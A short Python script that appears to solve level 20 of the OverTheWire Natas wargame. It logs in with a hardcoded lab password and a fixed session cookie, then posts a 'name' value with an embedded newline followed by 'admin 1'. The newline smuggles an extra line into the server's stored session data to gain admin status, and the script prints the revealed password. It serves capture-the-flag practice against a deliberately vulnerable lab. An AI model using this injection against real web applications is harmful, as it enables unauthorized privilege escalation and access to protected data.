import re
from base64 import b64encode

import requests

idx = 0
pw = ''
url = 'http://natas20.natas.labs.overthewire.org/index.php?debug'
userAndPass = b64encode(b"natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF").decode("ascii")
headers = {'Authorization': 'Basic %s' % userAndPass}

res = requests.post(url, headers=headers, data={'name': 'hans"\nadmin 1'}, cookies={'PHPSESSID': 'd5j7rn0m61iokfck5ssqa5dvc1'})

debugs = [line for line in res.text.splitlines() if re.search(r'DEBUG', line)]
pwd = [line for line in res.text.splitlines() if re.search(r'Password: ', line)]
print('\n'.join(debugs))
print(pwd)